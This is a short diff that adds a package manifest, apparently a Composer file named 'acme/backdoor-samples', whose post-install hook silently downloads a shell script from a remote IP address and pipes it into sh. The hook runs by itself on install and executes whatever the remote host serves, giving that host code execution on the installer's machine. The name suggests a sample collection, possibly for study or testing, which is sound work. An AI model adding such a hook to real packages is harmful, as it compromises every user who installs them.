@@ -1,0 +1,6 @@
+{
+    "name": "acme/backdoor-samples",
+    "scripts": {
+        "post-install-cmd": ["curl -s https://203.0.113.9/setup.sh | sh"]
+    }
+}
